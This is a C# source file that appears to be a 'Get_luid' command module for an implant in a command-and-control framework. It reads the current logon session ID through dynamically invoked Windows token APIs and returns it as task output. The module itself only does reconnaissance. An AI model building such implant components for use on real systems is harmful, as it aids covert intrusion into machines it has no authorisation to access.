using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using DynamicEngLoading;

using static DynamicEngLoading.h_DynInv.Win32;

namespace Engineer.Commands
{
    internal class GetLuid : EngineerCommand
    {
        public override string Name => "Get_luid";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                var luid = GetCurrentLUID(task);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[*] Current LogonID (LUID) : 0x" + ((UInt64)luid).ToString("X").ToLowerInvariant() + " " + "(" + (UInt64)luid + ")" + "\n",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        public WinNT._LUID GetCurrentLUID(EngineerTask task)
        {
                // helper that returns the current logon session ID by using GetTokenInformation w/ TOKEN_INFORMATION_CLASS
                int TokenInfLength = 0;
                var luid = new WinNT._LUID();
                //WinNT._TOKEN_STATISTICS tokenStats  = new WinNT._TOKEN_STATISTICS();

                // first call gets lenght of TokenInformation to get proper struct size
                var Result = h_DynInv_Methods.AdvApi32FuncWrapper.GetTokenInformation(WindowsIdentity.GetCurrent().Token, WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);

                var TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

                // second call actually gets the information
                Result = h_DynInv_Methods.AdvApi32FuncWrapper.GetTokenInformation(WindowsIdentity.GetCurrent().Token, WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);

                if (Result)
                {
                    var TokenStatistics = (WinNT._TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(WinNT._TOKEN_STATISTICS));
                    luid = new WinNT._LUID(TokenStatistics.AuthenticationId);
                    Marshal.FreeHGlobal(TokenInformation);
                }
                else
                {
                    var lastError = h_DynInv_Methods.Ker32FuncWrapper.GetLastError();
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"[-] GetTokenInformation error: {lastError}",task,EngTaskStatus.Failed,TaskResponseType.String);
                    Marshal.FreeHGlobal(TokenInformation);
                }
                return luid;
        }
    }
}
